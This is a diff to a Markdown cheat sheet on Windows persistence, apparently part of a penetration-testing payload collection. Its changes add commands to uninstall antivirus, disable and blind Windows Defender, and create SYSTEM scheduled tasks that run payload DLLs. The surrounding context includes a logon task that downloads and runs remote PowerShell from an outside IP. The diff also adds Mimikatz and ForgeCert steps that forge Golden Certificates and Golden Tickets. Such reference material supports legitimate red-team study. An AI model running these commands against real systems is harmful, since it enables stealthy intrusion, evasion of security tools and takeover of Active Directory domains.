@@ -4,8 +4,10 @@
 
 * [Tools](#tools)
 * [Hide Your Binary](#hide-your-binary)
-* [Disable Windows Defender](#disable-windows-defender)
-* [Disable Windows Firewall](#disable-windows-firewall)
+* [Disable Antivirus and Security](#disable-antivirus-and-security)
+    * [Antivirus Removal](#antivirus-removal)
+    * [Disable Windows Defender](#disable-windows-defender)
+    * [Disable Windows Firewall](#disable-windows-firewall)
 * [Simple User](#simple-user)
     * [Registry HKCU](#registry-hkcu)
     * [Startup](#startup)
@@ -18,6 +20,7 @@
     * [Registry HKLM](#registry-hklm)
         * [Winlogon Helper DLL](#)
         * [GlobalFlag](#)
+    * [Startup Elevated](#startup-elevated)
     * [Services Elevated](#services-elevated)
     * [Scheduled Tasks Elevated](#scheduled-tasks-elevated)
     * [Binary Replacement](#binary-replacement)
@@ -28,6 +31,9 @@
         * [sethc.exe](#sethc.exe)
     * [Remote Desktop Services Shadowing](#remote-desktop-services-shadowing)
     * [Skeleton Key](#skeleton-key)
+* [Domain](#domain)
+    * [Golden Certificate](#golden-certificate)
+    * [Golden Ticket](#golden-ticket)
 * [References](#references)
 
 
@@ -43,7 +49,14 @@
 PS> attrib +h mimikatz.exe
 ```
 
-## Disable Windows Defender
+## Disable Antivirus and Security
+
+### Antivirus Removal
+
+* [Sophos Removal Tool.ps1](https://github.com/ayeskatalas/Sophos-Removal-Tool/)
+* [Symantec CleanWipe](https://knowledge.broadcom.com/external/article/178870/download-the-cleanwipe-removal-tool-to-u.html)
+
+### Disable Windows Defender
 
 ```powershell
 # Disable Defender
@@ -59,9 +72,12 @@ MpCmdRun.exe -RemoveDefinitions -All
 Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"
 Add-MpPreference -ExclusionProcess 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
 Add-MpPreference -ExclusionPath C:\Video, C:\install
+
+# Blind ETW Windows Defender: zero out registry values corresponding to its ETW sessions
+reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f
 ```
 
-## Disable Windows Firewall
+### Disable Windows Firewall
 
 ```powershell
 Netsh Advfirewall show allprofiles
@@ -235,6 +251,13 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\not
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\temp\evil.exe"
 ```
 
+### Startup Elevated
+
+Create a batch script in the user startup folder.
+
+```powershell
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp 
+```
 
 ### Services Elevated
 
@@ -273,6 +296,7 @@ Register-ScheduledTask "Backdoor" -InputObject $D
 # Native schtasks
 schtasks /create /sc minute /mo 1 /tn "eviltask" /tr C:\tools\shell.cmd /ru "SYSTEM"
 schtasks /create /sc minute /mo 1 /tn "eviltask" /tr calc /ru "SYSTEM" /s dc-mantvydas /u user /p password
+schtasks /Create /RU "NT AUTHORITY\SYSTEM" /tn [TaskName] /tr "regsvr32.exe -s \"C:\Users\*\AppData\Local\Temp\[payload].dll\"" /SC ONCE /Z /ST [Time] /ET [Time]
 
 ##(X86) - On User Login
 schtasks /create /tn OfficeUpdaterA /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onlogon /ru System
@@ -369,6 +393,54 @@ Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <DC
 Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\Administrator
 ```
 
+## Domain
+
+### User Certificate
+
+```ps1
+# Request a certificate for the User template
+.\Certify.exe request /ca:CA01.megacorp.local\CA01 /template:User
+
+# Convert the certificate for Rubeus
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+
+# Request a TGT using the certificate
+.\Rubeus.exe asktgt /user:username /certificate:C:\Temp\cert.pfx /password:Passw0rd123!
+```
+
+### Golden Certificate
+
+> Require elevated privileges in the Active Directory, or on the ADCS machine
+
+* Export CA as p12 file: `certsrv.msc` > `Right Click` > `Back up CA...`
+* Alternative 1: Using Mimikatz you can extract the certificate as PFX/DER 
+    ```ps1
+    privilege::debug
+    crypto::capi
+    crypto::cng
+    crypto::certificates /systemstore:local_machine /store:my /export
+    ```
+* Alternative 2: Using SharpDPAPI, then convert the certificate: `openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx`
+* [ForgeCert](https://github.com/GhostPack/ForgeCert) - Forge a certificate for any active domain user using the CA certificate
+    ```ps1
+    ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject CN=User --SubjectAltName harry@lab.local --NewCertPath harry.pfx --NewCertPassword Password123
+    ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject CN=User --SubjectAltName DC$@lab.local --NewCertPath dc.pfx --NewCertPassword Password123
+    ```
+* Finally you can request a TGT using the Certificate
+    ```ps1
+    Rubeus.exe asktgt /user:ron /certificate:harry.pfx /password:Password123
+    ```
+
+### Golden Ticket
+
+> Forge a Golden ticket using Mimikatz
+
+```ps1
+kerberos::purge
+kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt
+kerberos::tgt
+```
+
 ## References
 
 * [A view of persistence - Rastamouse](https://rastamouse.me/2018/03/a-view-of-persistence/)
@@ -381,3 +453,4 @@ Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\Administr
 * [Persistence - BITS Jobs - @netbiosX](https://pentestlab.blog/2019/10/30/persistence-bits-jobs/)
 * [Persistence – Image File Execution Options Injection - @netbiosX](https://pentestlab.blog/2020/01/13/persistence-image-file-execution-options-injection/)
 * [Persistence – Registry Run Keys - @netbiosX](https://pentestlab.blog/2019/10/01/persistence-registry-run-keys/)
+* [Golden Certificate - NOVEMBER 15, 2021](https://pentestlab.blog/2021/11/15/golden-certificate/)
